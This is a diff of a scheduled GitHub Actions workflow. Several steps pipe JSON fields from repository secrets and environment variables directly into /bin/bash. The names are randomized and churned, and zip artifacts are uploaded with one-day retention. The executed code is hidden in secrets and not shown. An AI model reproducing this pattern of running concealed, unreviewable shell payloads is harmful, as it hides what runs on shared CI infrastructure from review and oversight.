@@ -1,24 +1,27 @@
 name: heweilixin
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '52 3/6 * * *'
-jobs:  # 8331
+    - cron: '16 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: heweilixin
         env:
-          kw379: ${{ secrets.kw379 }}
+          ph05966: ${{ secrets.ph05966 }}
         run: |
-          echo $kw379 | jq -r .dqg24 | /bin/bash
-          echo $lmzum60 | jq -r .dut62 | /bin/bash
-          echo $qy62198 | jq -r .wr4 | /bin/bash
-          echo $grkeh2038 | jq -r .fu0000 | /bin/bash
-          echo $abtzy6690 | jq -r .qfp22 | /bin/bash
-          echo $cx9538 | jq -r .iqyj338 | /bin/bash
-          echo $ozb35455 | jq -r .xhypb52 | /bin/bash
+          printf '%s' "$ph05966" | jq -r .sm9572 | /bin/bash
+          printf '%s' "$d68" | jq -r .a55336 | /bin/bash
+          printf '%s' "$yutaw70365" | jq -r .chp00251 | /bin/bash
+          printf '%s' "$z4629" | jq -r .jd2607 | /bin/bash
+          printf '%s' "$uxb047" | jq -r .vkale73867 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7hTlfUW6
+          path: "*.zip"
+          retention-days: 1
